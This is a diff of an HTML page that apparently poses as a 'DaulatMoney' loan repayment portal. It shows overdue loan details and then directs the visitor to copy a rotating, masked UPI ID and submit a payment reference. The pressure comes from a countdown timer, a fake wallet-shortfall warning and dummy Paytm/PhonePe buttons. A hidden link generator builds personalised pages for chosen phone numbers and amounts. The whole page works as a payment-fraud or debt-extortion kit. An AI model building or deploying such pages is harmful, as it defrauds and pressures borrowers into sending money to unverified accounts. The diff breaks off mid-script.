@@ -2,373 +2,1023 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pay to DaulatMoney</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DaulatMoney - Repayment Portal</title>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const hasParams = urlParams.has('m') || urlParams.has('p');
+
+        const MY_CONFIG = {
+            appName: "DaulatMoney",              
+            upiList: [
+                "6372849102@okaxis",
+                "daulatpay@paytm",  
+                "6372849102@okaxis"   
+            ],
+            mobileNumber: urlParams.get('m') || "8072344052",        
+            payableAmount: urlParams.get('p') || "₹3329",           
+            loanAmount: urlParams.get('la') || "₹3,000",
+            disbursedAmount: urlParams.get('d') || "₹1,800",        
+            loanTerm: urlParams.get('lt') || "7 Days",                 
+            interest: urlParams.get('int') || "₹29",
+            overdueFee: urlParams.get('fee') || "₹300",
+            repaymentDate: urlParams.get('date') || "03/10/2026",
+            orderId: urlParams.get('id') || "00642464690",                 
+            overdueText: urlParams.get('o') || "Overdue"        
+        };
+    </script>
+
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-
         body {
-            background-color: #0f172a;
+            background-color: #f3f4f8;
             color: #333;
-            padding: 15px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 10px;
+            touch-action: manipulation;
+            -webkit-text-size-adjust: 100%;
         }
 
         .container {
             width: 100%;
-            max-width: 480px;
-            background-color: #e2e8f0;
-            border-radius: 20px;
-            padding: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            max-width: 410px;
+            background: #f3f4f8;
+            border-radius: 24px;
+            overflow: hidden;
+            position: relative;
+            padding-bottom: 25px;
+            display: none;
         }
-
-        /* Top Brand Header */
-        .brand-header {
+        .top-card {
+            background: linear-gradient(135deg, #3b82f6 0%, #2b70ff 100%);
+            margin: 10px 14px 0 14px;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 22px 15px;
             text-align: center;
-            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(43, 112, 255, 0.15);
         }
-
-        .brand-title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #1a73e8;
+        .logo-area {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
+            margin-bottom: 4px;
         }
-
-        .brand-logo-box {
-            width: 32px;
-            height: 32px;
-            background-color: #ffffff;
-            border: 1.5px solid #1a73e8;
-            border-radius: 6px;
+        .logo-box {
+            width: 34px;
+            height: 34px;
+            background: white;
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-        }
-
-        .brand-logo-m {
-            color: #1a73e8;
-            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            font-weight: 800;
+            font-style: italic;
+            color: #2b70ff;
             font-size: 18px;
+            letter-spacing: -1px;
         }
-
-        .mobile-sub {
-            font-size: 13px;
-            color: #555;
-            margin-top: 4px;
+        .brand-name {
+            font-size: 21.5px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #ffffff;
         }
-
-        /* Info Grid */
-        .info-card-grid {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
+        .mobile-num {
+            font-size: 13.5px;
+            color: #ffffff;
+            font-weight: 500;
+            margin-top: 3px;
         }
-
         .info-box {
+            background: white;
+            margin: 0 14px 14px 14px;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            padding: 18px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+        }
+        .amount-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 14px;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+        .amount-col {
             flex: 1;
-            background: #ffffff;
-            padding: 12px;
-            border-radius: 12px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
-
-        .info-label {
-            font-size: 12px;
-            color: #666;
+        .amount-col:first-child {
+            border-right: 1px solid #f1f5f9;
+            padding-right: 10px;
+        }
+        .amount-col:last-child {
+            padding-left: 15px;
+        }
+        .label {
+            font-size: 13px;
+            color: #8e8e93;
             margin-bottom: 4px;
+            font-weight: 400;
         }
-
-        .info-value {
+        .value-blue {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1b6ef3;
+        }
+        .value-date {
+            font-size: 18px;
+            font-weight: 700;
+            color: #2977ff;
+        }
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 14px;
+            font-size: 13.5px;
+            color: #8e8e93;
+        }
+        .order-id {
+            color: #222222;
+            font-weight: 700;
+            margin-left: 8px;
+        }
+        .overdue-badge {
+            color: #e11d48;
+            border: 1px solid #fca5a5;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            background: #fff;
+        }
+        .details-card {
+            background: white;
+            margin: 0 14px 14px 14px;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+        }
+        .section-title {
             font-size: 16px;
-            font-weight: bold;
-            color: #1a73e8;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 14px;
         }
-
-        .info-value-date {
-            font-size: 15px;
-            font-weight: bold;
-            color: #1a73e8;
-        }
-
-        /* Loan Details */
-        .loan-details-container {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-
-        .section-heading {
-            font-size: 14px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 12px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 6px;
-        }
-
         .detail-row {
             display: flex;
             justify-content: space-between;
-            font-size: 14px;
-            margin-bottom: 8px;
-            color: #444;
-        }
-
-        .detail-row span:last-child {
-            font-weight: 600;
-            color: #111;
-        }
-
-        /* Payment Modal */
-        .modal-overlay {
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-            margin-bottom: 20px;
-        }
-
-        .modal-header {
-            display: flex;
             align-items: center;
-            gap: 12px;
             margin-bottom: 12px;
+            font-size: 14px;
         }
-
-        .logo-box {
-            width: 42px;
-            height: 42px;
-            background-color: #ffffff;
-            border: 1.5px solid #1a73e8;
-            border-radius: 8px;
+        .detail-label {
+            color: #4a4a4a;
+            font-weight: 400;
+        }
+        .detail-value {
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        .terms-text {
+            font-size: 11px;
+            color: #9ca3af;
+            margin-top: 16px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        .terms-text a {
+            color: #3b82f6;
+            text-decoration: none;
+        }
+        .action-container {
+            display: flex;
+            gap: 10px;
+            padding: 0 14px;
+            margin-top: 22px;
+            position: relative;
+        }
+        .btn-repayment {
+            flex: 1;
+            background: white;
+            border: none;
+            padding: 12px;
+            border-radius: 14px;
+            font-size: 14.5px;
+            font-weight: 600;
+            color: #4b5563;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
         }
-
-        .logo-m {
-            color: #1a73e8;
-            font-weight: 800;
-            font-size: 22px;
+        .btn-discount-wrapper {
+            flex: 1.7;
+            position: relative;
         }
-
-        .header-text {
-            font-size: 16px;
+        .btn-discount {
+            width: 100%;
+            height: 48px;
+            background: #2b70ff;
+            border: none;
+            border-radius: 14px;
+            font-size: 14.5px;
             font-weight: 600;
-            color: #202124;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            box-shadow: 0 4px 12px rgba(43, 112, 255, 0.2);
+        }
+        .arrow-circle {
+            width: 20px;
+            height: 20px;
+            border: 1.5px solid rgba(255,255,255,0.7);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+        }
+        .fire-badge {
+            position: absolute;
+            top: -11px;
+            right: 12px;
+            background: #ef4444;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px 10px 10px 0;
+            font-weight: 700;
+            box-shadow: 0 2px 5px rgba(239, 68, 68, 0.3);
+            white-space: nowrap;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 11.5px;
+            color: #9ca3af;
+            margin-top: 14px;
+        }
+        .footer-note span {
+            color: #3b82f6;
+            font-weight: 600;
         }
 
-        .amount {
-            font-size: 26px;
-            color: #1a73e8;
-            font-weight: 500;
-            margin-left: 54px;
+        /* Clean Modal Popup matching second screenshot */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: none;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 100;
+        }
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 410px;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            padding: 24px 20px 28px 20px;
+            text-align: center;
+        }
+        .modal-logo-box {
+            width: 52px;
+            height: 52px;
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px auto;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .modal-logo-inner {
+            font-weight: 800;
+            color: #2b70ff;
+            font-size: 24px;
+            font-family: Arial, sans-serif;
+        }
+        .modal-header-text {
+            font-size: 17px;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 8px;
+        }
+        .modal-amount {
+            font-size: 22px;
+            font-weight: 700;
+            color: #2b70ff;
             margin-bottom: 16px;
         }
-
         .warning-box {
-            background-color: #fce8e6;
-            color: #d93025;
-            font-size: 13px;
-            line-height: 1.4;
+            background: #fff8f8;
+            border: 1px solid #ffe3e3;
+            color: #d32f2f;
             padding: 10px 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            border-radius: 10px;
+            font-size: 11.5px;
+            line-height: 1.45;
+            margin-bottom: 18px;
+            text-align: center;
+            font-weight: 500;
         }
-
-        .row {
+        .payment-option {
             display: flex;
             justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 6px;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #f2f3f5;
+            font-size: 14px;
+            text-align: left;
         }
-
-        .row-title {
-            font-size: 15px;
-            color: #202124;
-            font-weight: 500;
-        }
-
-        .row-value {
-            font-size: 15px;
-            color: #202124;
-            font-weight: 500;
-            text-align: right;
-        }
-
         .sub-text {
-            font-size: 12px;
-            color: #70757a;
-            text-align: right;
-            margin-bottom: 16px;
+            font-size: 11px;
+            color: #9ca3af;
+            margin-top: 2px;
+            display: block;
         }
-
-        .repay-btn {
+        .radio-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #22c55e;
+            color: white;
+            font-size: 10px;
+        }
+        .wallet-right {
+            text-align: right;
+        }
+        .wallet-right span {
+            font-weight: 600;
+            font-size: 14px;
+            color: #111827;
+        }
+        .btn-repay-modal {
             width: 100%;
-            background-color: #202124;
-            color: #ffffff;
+            background: #111827;
+            color: white;
             border: none;
             padding: 14px;
-            border-radius: 8px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        #step3Screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #f3f4f8;
+            overflow-y: auto;
+            z-index: 200;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .step3-container {
+            width: 100%;
+            max-width: 410px;
+            background: #f3f4f8;
+            min-height: 100vh;
+            padding-bottom: 30px;
+        }
+        .step3-top-header {
+            background: #000000;
+            color: white;
+            padding: 14px 20px;
+            width: 100%;
+        }
+        .step3-amount-title {
+            font-size: 13.5px;
+            font-weight: 400;
+            color: #ffffff;
+            margin-bottom: 3px;
+        }
+        .step3-amount-title span {
+            font-weight: 700;
+            font-size: 14.5px;
+        }
+        .step3-discount {
+            color: #f97316;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .gateway-card {
+            background: white;
+            margin: 14px;
+            border-radius: 16px;
+            padding: 18px 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
+        .method-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            font-size: 14px;
+            color: #374151;
+            font-weight: 500;
+        }
+        .timer {
+            color: #f97316;
+            font-weight: 700;
+        }
+        .pay-app-btn {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #e5e7eb;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            background: #ffffff;
+            cursor: pointer;
+            height: 56px;
+        }
+        .paytm-logo-text {
+            font-family: Arial, sans-serif;
+            font-weight: 900;
+            font-size: 26px;
+            letter-spacing: -0.9px;
+            line-height: 1;
+        }
+        .paytm-blue { color: #002e6e; }
+        .paytm-cyan { color: #00b9f1; }
+        .phonepe-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .phonepe-icon-circle {
+            width: 34px;
+            height: 34px;
+            background: #5f259f;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
             font-size: 16px;
+            font-family: Arial, sans-serif;
+        }
+        .phonepe-text {
+            color: #5f259f;
+            font-size: 20px;
+            font-weight: 700;
+            font-family: Arial, sans-serif;
+            letter-spacing: -0.3px;
+        }
+        .hand-tap-icon {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .upi-section-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-top: 8px;
+            margin-bottom: 8px;
+        }
+        .upi-display-box {
+            flex: 1;
+            background: #f3f4f6;
+            border: 1px solid #e5e7eb;
+            padding: 12px 14px;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 14.5px;
+            color: #111827;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .copy-btn-new {
+            background: #1677ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .utr-input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-top: 8px;
+            outline: none;
+            background: #f9fafb;
+        }
+        .submit-utr-btn {
+            width: 100%;
+            background: #1677ff;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+        .utr-help-footer {
+            text-align: center;
+            font-size: 12.5px;
+            color: #4b5563;
+            margin-top: 16px;
+        }
+        .utr-help-footer a {
+            color: #f97316;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .generator-box {
+            width: 100%;
+            max-width: 410px;
+            background: white;
+            padding: 22px;
+            border-radius: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            display: none;
+        }
+        .generator-box h2 {
+            font-size: 18px;
+            color: #1a1a1a;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #4b5563;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .gen-btn {
+            width: 100%;
+            background: #2b70ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
         }
-
-        /* Payment Methods Section */
-        .payment-methods-section {
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-        }
-
-        .section-title {
-            font-size: 15px;
-            font-weight: bold;
-            margin-bottom: 12px;
-            color: #202124;
-        }
-
-        .method-btn {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #f8fafc;
-            border: 1px solid #cbd5e1;
-            padding: 12px 16px;
-            border-radius: 10px;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 15px;
-            color: #0f172a;
-        }
-
-        .utr-box {
+        .result-box {
             margin-top: 15px;
-            background: #f1f5f9;
-            padding: 12px;
-            border-radius: 10px;
-        }
-
-        .utr-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #cbd5e1;
+            background: #f9fafb;
+            border: 1px dashed #cbd5e1;
+            padding: 10px;
             border-radius: 8px;
-            font-size: 14px;
-            margin-top: 6px;
+            word-break: break-all;
+            font-size: 12.5px;
+            color: #334155;
+            display: none;
+        }
+        .copy-gen-btn {
+            background: #16a34a;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: 600;
+            display: none;
+            margin-top: 8px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Top Account Header -->
-    <div class="brand-header">
-        <div class="brand-title">
-            <div class="brand-logo-box"><span class="brand-logo-m">M</span></div>
-            DaulatMoney
+<div class="container" id="step1Screen">
+    <div class="top-card">
+        <div class="logo-area">
+            <div class="logo-box">M</div>
+            <div class="brand-name" id="lblAppName1"></div>
         </div>
-        <div class="mobile-sub">Mobile Number: 807****052</div>
+        <div class="mobile-num">Mobile Number: <span id="lblMobile"></span></div>
     </div>
 
-    <!-- Top Info Grid -->
-    <div class="info-card-grid">
-        <div class="info-box">
-            <div class="info-label">Payable Amount</div>
-            <div class="info-value">₹3329</div>
-        </div>
-        <div class="info-box">
-            <div class="info-label">Repayment Date</div>
-            <div class="info-value-date">03/10/2026</div>
-        </div>
-    </div>
-
-    <!-- Loan Details Panel -->
-    <div class="loan-details-container">
-        <div class="section-heading">Loan Details</div>
-        <div class="detail-row">
-            <span>Loan Amount</span>
-            <span>₹3,000</span>
-        </div>
-        <div class="detail-row">
-            <span>Disbursed Amount</span>
-            <span>₹1,800</span>
-        </div>
-        <div class="detail-row">
-            <span>Order No.</span>
-            <span>00642464690</span>
-        </div>
-    </div>
-
-    <!-- Payment Modal Box -->
-    <div class="modal-overlay">
-        <div class="modal-header">
-            <div class="logo-box">
-                <span class="logo-m">M</span>
+    <div class="info-box">
+        <div class="amount-row">
+            <div class="amount-col">
+                <div class="label">Payable Amount</div>
+                <div class="value-blue" id="lblPayable1"></div>
             </div>
-            <div class="header-text">Pay to DaulatMoney</div>
+            <div class="amount-col">
+                <div class="label">Repayment Date</div>
+                <div class="value-date" id="lblDate"></div>
+            </div>
         </div>
-
-        <div class="amount">₹3,329</div>
-
-        <div class="warning-box">
-            Insufficient wallet balance, pay another ₹3,329 via UPI to complete your order
+        <div class="order-row">
+            <div>Order NO. <span class="order-id" id="lblOrderId"></span></div>
+            <div class="overdue-badge" id="lblOverdueText"></div>
         </div>
-
-        <div class="row">
-            <span class="row-title">Wallet</span>
-            <span class="row-value">-₹0 &#10003;</span>
-        </div>
-        
-        <div class="sub-text">
-            Available balance: ₹0
-        </div>
-
-        <div class="row" style="margin-top: 12px;">
-            <span class="row-title">UPI</span>
-            <span class="row-value">-₹3,329 <span style="color: #1e8e3e;">&#10004;</span></span>
-        </div>
-
-        <button class="repay-btn">Repay</button>
     </div>
 
-    <!-- Payment Options & UTR Section -->
-    <div class="payment-methods-section">
-        <div class="section-title">Select a method to pay:</div>
-        <div class="method-btn">
-            <span>Paytm</span>
-            <span>📥</span>
+    <div class="details-card">
+        <div class="section-title">Loan Details</div>
+        <div class="detail-row">
+            <span class="detail-label">Loan Amount</span>
+            <span class="detail-value" id="lblLoanAmount"></span>
         </div>
-        <div class="method-btn">
-            <span>PhonePe</span>
-            <span>📥</span>
+        <div class="detail-row">
+            <span class="detail-label">Disbursed Amount</span>
+            <span class="detail-value" id="lblDisbursedAmount"></span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Loan Term</span>
+            <span class="detail-value" id="lblLoanTerm"></span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Interest</span>
+            <span class="detail-value" id="lblInterest"></span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Overdue Fee</span>
+            <span class="detail-value" id="lblOverdueFee"></span>
+        </div>
+        <div class="terms-text">
+            I have read and agreed to <span id="lblAppNameContract"></span>'s <a href="#">Sanction Letter</a> and <a href="#">Loan Service Contract</a>.
+        </div>
+    </div>
+
+    <div class="action-container">
+        <button class="btn-repayment" onclick="openModal()">Repayment</button>
+        <div class="btn-discount-wrapper">
+            <div class="fire-badge">🔥 95% Choices</div>
+            <button class="btn-discount" onclick="openModal()">
+                Discount Repayment
+                <div class="arrow-circle">↓</div>
+            </button>
+        </div>
+    </div>
+
+    <div class="footer-note">
+        Repay from <span>APP</span> will help you to get <span>Higher Limit</span>.
+    </div>
+</div>
+
+<div class="modal-overlay" id="paymentModal" onclick="closeModal(event)">
+    <div class="modal-content" onclick="event.stopPropagation()">
+        <div class="modal-logo-box">
+            <div class="modal-logo-inner">M</div>
         </div>
         
-        <div class="utr-box">
-            <div style="font-size: 13px; font-weight: 600; color: #333;">2. Fill in UTR after payment</div>
-            <input type="text" class="utr-input" placeholder="Please enter the 12-character UTR">
+        <div class="modal-header-text" id="lblPayToApp"></div>
+        <div class="modal-amount" id="lblPayable2"></div>
+
+        <div class="warning-box" id="lblWarning"></div>
+
+        <div class="payment-option">
+            <div class="payment-option-left">
+                <span>Wallet</span>
+                <span class="sub-text">Available balance: ₹0</span>
+            </div>
+            <div class="wallet-right">
+                <span>-₹0</span>
+            </div>
+        </div>
+
+        <div class="payment-option" style="border-bottom: none;">
+            <div class="payment-option-left">
+                <span>UPI</span>
+            </div>
+            <div class="wallet-right" style="display: flex; align-items: center; gap: 8px;">
+                <span id="lblUpiAmount"></span>
+                <div class="radio-dot">✓</div>
+            </div>
+        </div>
+
+        <button class="btn-repay-modal" onclick="goToStep3()">Repay</button>
+    </div>
+</div>
+
+<div id="step3Screen">
+    <div class="step3-container">
+        <div class="step3-top-header">
+            <div class="step3-amount-title">Amount Payable: <span id="lblStep3Payable"></span></div>
+            <div class="step3-discount">Get ₹0.01 off</div>
+        </div>
+
+        <div class="gateway-card">
+            <div class="method-header">
+                <span>Select a method to pay:</span>
+                <span class="timer">04:50</span>
+            </div>
+
+            <div class="pay-app-btn" onclick="alert('Opening Paytm App...')">
+                <div class="paytm-logo-text">
+                    <span class="paytm-blue">pay</span><span class="paytm-cyan">tm</span>
+                </div>
+                <div class="hand-tap-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 11V6a2 2 0 0 0-4 0v5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M14 10V4a2 2 0 0 0-4 0v6" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M10 10.5V6a2 2 0 0 0-4 0v8.5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M6 14v2a6 6 0 0 0 6 6h2a6 6 0 0 0 6-6v-4" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="pay-app-btn" onclick="alert('Opening PhonePe App...')">
+                <div class="phonepe-brand">
+                    <div class="phonepe-icon-circle">पे</div>
+                    <span class="phonepe-text">PhonePe</span>
+                </div>
+                <div class="hand-tap-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 11V6a2 2 0 0 0-4 0v5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M14 10V4a2 2 0 0 0-4 0v6" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M10 10.5V6a2 2 0 0 0-4 0v8.5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M6 14v2a6 6 0 0 0 6 6h2a6 6 0 0 0 6-6v-4" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <div class="gateway-card">
+            <div style="font-size: 13px; color: #4b5563; margin-bottom: 4px;">1.Copy the UPI below and <span style="color: #f97316; font-weight:600;" id="lblTransferText"></span></div>
+            
+            <div class="upi-section-row">
+                <div class="upi-display-box" id="upiText"></div>
+                <button class="copy-btn-new" onclick="copyUpi()">Copy</button>
+            </div>
+
+            <div class="timer" style="font-size: 11.5px; margin-top: 6px; margin-bottom: 12px;">Tip: Don't save the upi, this upi is valid for 10 minutes</div>
+
+            <div style="font-size: 13px; color: #4b5563; margin-top: 10px; margin-bottom: 4px;">2.Fill in UTR after payment</div>
+            <input type="text" class="utr-input" placeholder="Please enter the 12-character UTR" id="utrInput">
+
+            <button class="submit-utr-btn" onclick="submitUtr()">Submit UTR</button>
+        </div>
+
+        <div class="utr-help-footer">
+            Tip: How to get UTR? Please <a href="#" onclick="alert('Please check your payment app transaction history to copy the 12-digit UTR/UPI reference number.'); return false;">click here</a>
         </div>
     </div>
 </div>
+
+<div class="generator-box" id="generatorBox">
+    <h2>⚡ DaulatMoney Link Generator</h2>
+    
+    <div class="form-group">
+        <label>Mobile Number:</label>
+        <input type="text" id="genMobile" value="8072344052">
+    </div>
+
+    <div class="form-group">
+        <label>Payable Amount:</label>
+        <input type="text" id="genPayable" value="₹3329">
+    </div>
+
+    <div class="form-group">
+        <label>Loan Amount:</label>
+        <input type="text" id="genLoanAmount" value="₹3,000">
+    </div>
+
+    <div class="form-group">
+        <label>Disbursed Amount:</label>
+        <input type="text" id="genDisbursed" value="₹1,800">
+    </div>
+
+    <div class="form-group">
+        <label>Loan Term:</label>
+        <input type="text" id="genLoanTerm" value="7 Days">
+    </div>
+
+    <div class="form-group">
+        <label>Interest:</label>
+        <input type="text" id="genInterest" value="₹29">
+    </div>
+
+    <div class="form-group">
+        <label>Overdue Fee:</label>
+        <input type="text" id="genOverdueFee" value="₹300">
+    </div>
+
+    <div class="form-group">
+        <label>Repayment Date:</label>
+        <input type="text" id="genDate" value="03/10/2026">
+    </div>
+
+    <div class="form-group">
+        <label>Overdue Text:</label>
+        <input type="text" id="genOverdue" value="Overdue">
+    </div>
+
+    <div class="form-group">
+        <label>Order ID:</label>
+        <input type="text" id="genOrder" value="00642464690">
+    </div>
+
+    <button class="gen-btn" onclick="generateLink()">Generate Link 🚀</button>
+
+    <div class="result-box" id="resultLink"></div>
+    <button class="copy-gen-btn" id="copyBtn" onclick="copyGeneratedLink()">Copy Link 📋</button>
+</div>
+
+<script>
+    var currentUpiIndex = 0;
+    var upiTimer = null;
+
+    function formatMobile(num) {
+        if(num && num.length >= 7) {
+            return num.substring(0, 3) + "****" + num.substring(7);
+        }
+        return num || '';
+    }
+
+    function formatUpi(upi) {
+        if (!upi) return '';
+        var parts = upi.split('@');
+        if (parts.length === 2) {
+            var name = parts[0];
+            if (name.length <= 3) {
+                return name + '***@' + parts[1];
+            }
+            return name.substring(0, 3) + '******@' + parts[1];
+        }
+        return upi;
+    }
+
+    function updateUpiDisplay() {
+        if (!MY_CONFIG.upiList || MY_CONFIG.upiList.length === 0) return;
+        var activeUpi = MY_CONFIG.upiList[currentUpiIndex];
+        document.getElementById('upiText').innerText = formatUpi(activeUpi);
+    }
+
+    function startUpiRotation() {
+        if (upiTimer) clearInterval(upiTimer);
+        upiTimer = setInterval(function() {
+            if (MY_CONFIG.upiList && MY_CONFIG.upiList.length > 0) {
+                currentUpiIndex = (currentUpiIndex + 1) % MY_CONFIG.upiList.length;
+                updateUpiDisplay();
+            }
+        }, 10000);
+    }
+
+    window.onload = function() {
+        if (hasParams) {
+            document.getElementById('step1Screen').style.display = 'block';
+            document.getElementById('generatorBox').style.display = 'none';
+
+            document.getElementById('lblAppName1').innerText = MY_CONFIG.appName;
+            document.getElementById('lblAppNameContract').innerText = MY_CONFIG.appName;
+            document.getElementById('lblPayToApp').innerText = "Pay to " + MY_CONFIG.appName;
+
+            document.getElementById('lblMobile').innerText = formatMobile(MY_CONFIG.mobileNumber);
+            document.getElementById('lblPayable1').innerText = MY_CONFIG.payableAmount;
+            document.getElementById('lblDate').innerText = MY_CONFIG.repaymentDate;
+            
+            document.getElementById('lblOrderId').innerText = MY_CONFIG.orderId;
+            document.getElementById('lblOverdueText').innerText = MY_CONFIG.overdueText;
+            
+            document.getElementById('lblLoanAmount').innerText = MY_CONFIG.loanAmount;
+            document.getElementById('lblDisbursedAmount').innerText = MY_CONFIG.disbursedAmount;
+            document.getElementById('lblLoanTerm').innerText = MY_CONFIG.loanTerm;
+            document.getElementById('lblInterest').innerText = MY_CONFIG.interest;
+            document.getElementById('lblOverdueFee').innerText = MY_CONFIG.overdueFee;
+            
+            document.getElementById('lblPayable2').innerText = MY_CONFIG.payableAmount;
